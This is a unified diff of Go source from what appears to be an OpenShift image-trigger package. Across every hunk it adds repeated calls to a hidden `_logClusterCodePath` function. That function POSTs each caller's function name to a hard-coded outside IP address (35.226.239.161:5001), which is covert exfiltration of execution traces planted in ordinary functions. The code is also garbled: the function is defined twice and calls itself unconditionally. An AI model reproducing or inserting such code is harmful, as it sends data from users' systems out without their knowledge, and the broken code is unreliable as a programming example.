@@ -34,6 +34,8 @@ func calculateAnnotationTriggers(m metav1.Object, prefix string) (string, string
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var key, namespace string
 	if namespace = m.GetNamespace(); len(namespace) > 0 {
 		key = prefix + namespace + "/" + m.GetName()
@@ -68,6 +70,8 @@ func hasDuplicateTriggers(triggers []triggerapi.ObjectFieldTrigger) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for i := range triggers {
 		for j := i + 1; j < len(triggers); j++ {
 			if triggers[i].FieldPath == triggers[j].FieldPath {
@@ -78,6 +82,8 @@ func hasDuplicateTriggers(triggers []triggerapi.ObjectFieldTrigger) bool {
 	return false
 }
 func parseContainerReference(path string) (init bool, selector string, remainder string, ok bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -127,6 +133,8 @@ func findContainerBySelector(spec ometa.PodSpecReferenceMutator, init bool, sele
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if i, err := strconv.Atoi(selector); err == nil {
 		return spec.GetContainerByIndex(init, i)
 	}
@@ -136,6 +144,8 @@ func findContainerBySelector(spec ometa.PodSpecReferenceMutator, init bool, sele
 	return nil, false
 }
 func ContainerForObjectFieldPath(obj runtime.Object, fieldPath string) (ometa.ContainerMutator, string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -171,6 +181,8 @@ func ContainerForObjectFieldPath(obj runtime.Object, fieldPath string) (ometa.Co
 	return container, remainder, nil
 }
 func UpdateObjectFromImages(obj runtime.Object, tagRetriever trigger.TagRetriever) (runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -255,6 +267,8 @@ func ContainerImageChanged(oldObj, newObj runtime.Object, newTriggers []triggera
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, trigger := range newTriggers {
 		if trigger.Paused {
 			continue
@@ -292,9 +306,13 @@ func NewAnnotationTriggerIndexer(prefix string) trigger.Indexer {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return annotationTriggerIndexer{prefix: prefix}
 }
 func (i annotationTriggerIndexer) Index(obj, old interface{}) (string, *trigger.CacheEntry, cache.DeltaType, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -388,6 +406,8 @@ func (r *AnnotationReactor) ImageChanged(obj runtime.Object, tagRetriever trigge
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	changed, err := UpdateObjectFromImages(obj, tagRetriever)
 	if err != nil {
 		return err
@@ -412,6 +432,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -486,5 +527,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
